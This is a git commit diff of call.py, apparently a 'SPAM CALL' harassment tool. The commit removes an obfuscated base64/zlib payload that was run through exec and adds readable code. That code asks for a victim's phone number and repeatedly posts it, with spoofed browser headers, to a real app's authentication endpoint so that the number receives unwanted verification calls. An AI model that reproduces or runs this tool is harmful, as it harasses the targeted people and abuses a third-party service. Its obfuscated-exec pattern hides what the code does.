eb871c9ad28f9e69b3c01233107dd2307134f879
TheXmanz <52388234+BangDanz@users.noreply.github.com>
2020-06-10 17:54:43 +0700

    Update call.py

--- call.py
+++ call.py
@@ -1,2 +1,37 @@
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("eJzFVutu2zYU/q+nONUfy6sj35I4ceAMcubGXqw48AXrmgYGLdEWa90mUk2cuu+wHysKDNjT7E36JDu6RWrqLMAwoLREk4c85zvkOeJHEWzaEmBhju8FAjxe4RteEcyhlSB6fgspF7wSENf0nHjmMvAcyAYyPd/j4unRCeWcea5E7wzqCxjE0l4QeEECjsUPmCtAkXXPDG0KC2qHDgiKUi6IbcvlbGLkmsptSn2lUX6sPaEmcVcwSJQgMaaq6jPqHldx1YI6iuwzH1JMcKhhEZfd03xBC74vf4P64HNgEc5sMNkzXpt0CQtis7VSTjZgCR1E9UOhyG9rzeZ1/eT4wDmFrN1yLnp6VxsOQMlEDWcTN6PBai4UuUq5Dbk89YQtI6gOyBu5vWvxG2F5LhjouupvUh1qP2iJXAsAlVR6x55wue70Xg+muTdojOMi00xQylIY2NiXLSF83q5Wb29vVYOJGNrwnKpJHa/qMM4jCfGZ6lu+LBV8NWxKArSaBUGWpRSteXRycNKoHTlzLBC9kLQgerJOKkll0nU0bTuf30TVFrZvq9tInlSx5KErzeNpaX+bVMm0eSqJW1El5Xvz5dMfXz79/v2ezwVftnlgQJtN+6MxtDPRofNK6+sD0K7e5Aqwu2yfsPnraDaddXsFm9qV/gbO+trlZW/472afsnk+mPZn3dzPhpPlzooJK1zEadPFz/8n4t6jnSLK9qs4/Pld4/CXhLma523u2Id8ZS/TZiT+WDgGzkaX01E/7h/XHOicFj7xl4eNo+PDvz8Xf4jjervOlh1Yj6AuRzpmxVQbn/emBcBcD9D4Ozs2LpT/APDzTB9qfZhcaXoaLER4BPDtNrWczvMFPRNrF13j6ooKBY+asironZCEt6aRPKDqkrkmHi1KUGJmRzZ4sJzHozK8J3ZIO7Ki/vBjWT4tVQBtla9rN1JIUPWDVDrzXJcaAs+xUhtKF3io72k2e09LFal0t5dyBTX3bjEvoxmv9WEfU3WcDESzQk6DPbKirojGde+e4SFXPVBroAyZG96dgOaagcdMqNdOYKLpk9nlOUz0Pa1ea70qg+b7Nv2FLi6YqB40W2rzEJSL/lQfVgBZhcI5NdZeGSbE4aG76gbeLQJW63W1AWcWMjStthBMbbZaNbW+30SiXDBksAlZkoClFkvSR8mycMXXcl2uyDV8G/KNRKJNSK4DqmF5zKCKZSGlEZFsjsHMUtv1cJEi2DB3VWoTgp18g0vt+A+tL70AGKZPZG5FlXd2yoYiu5TENENdM45kdMWIQtnBtwKIRzpYVcCixKQB74QkDXKmWeDcffXogYojEpQnoWEgFckReoRQ4LUCse/m4jhjdyZstzfua5PBMOd9ZE9O/wfjdTz/tHMts5xepLJriZr0MSG5mifn1xes56CRsMfj0fjFi4Lzz3p7hRe0NSdw4bl0zVmUtaTqeg4GVpAAv73UWCEUB2UpvfpI/wDtU1y/")))
+import os,sys,time,requests,json
+from requests import post
+def balik():
+    f = input("\033[1;97mKEMBALI (y/t): \033[1;92m")
+    if f == "y":
+       os.system("python call.py")
+    elif f == "t":
+         sys.exit("\033[1;91mexit\033[1;97m")
+print ("\tSPAM CALL V4.0")
+print ("      Coded: \033[1;96mFahmiApz\033[1;97m")
+print ("\033[1;97m*     Github:\033[1;92m github.com/BangDanz\033[1;97m      *")
+print()
+print ("\033[90m>\033[1;97m CONTOH: \033[1;92m+62857×××××××××")
+no = input("\033[90m> \033[1;97mNOMOR TARGET: \033[1;92m")
+
+ua = {
+"Host": "api.myfave.com",
+"Connection": "keep-alive",
+"x-user-agent": "Fave-PWA/v1.0.0",
+"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
+"content-type": "application/json",
+"Accept": "*/*",
+"Origin": "https://m.myfave.com",
+"Referer": "https://m.myfave.com/jakarta/auth",
+"Accept-Encoding": "gzip, deflate, br",
+"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+}
+for i in range(1,5):
+    dat = {"phone":no}
+    r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
+    if "6c047709f9da4291a568fa84b97b6d47" in r:
+        print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mFAILED")
+    else:
+        print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mSUCCESS")
+    time.sleep(300)
+
+balik()
